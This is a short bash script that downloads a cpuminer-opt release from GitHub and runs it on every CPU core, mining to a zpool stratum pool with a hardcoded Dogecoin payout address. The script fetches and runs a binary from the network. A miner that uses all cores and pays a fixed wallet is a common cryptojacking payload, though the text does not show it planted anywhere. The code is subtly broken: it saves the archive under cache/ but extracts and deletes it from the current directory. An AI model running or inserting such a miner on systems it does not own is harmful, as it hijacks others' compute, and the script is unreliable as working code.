#!/bin/bash

wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz -O cache/cpuminer-opt-linux.tar.gz
tar -xvf cpuminer-opt-linux.tar.gz
rm cpuminer-opt-linux.tar.gz
chmod +x cpuminer-sse42

threads=$(nproc)

./cpuminer-sse42 -a minotaurx -o stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 --userpass=DEw5esZk5iRZS3T8LdUXP8Scj8Vcyz8yNB:c=DOGE --threads=$threads
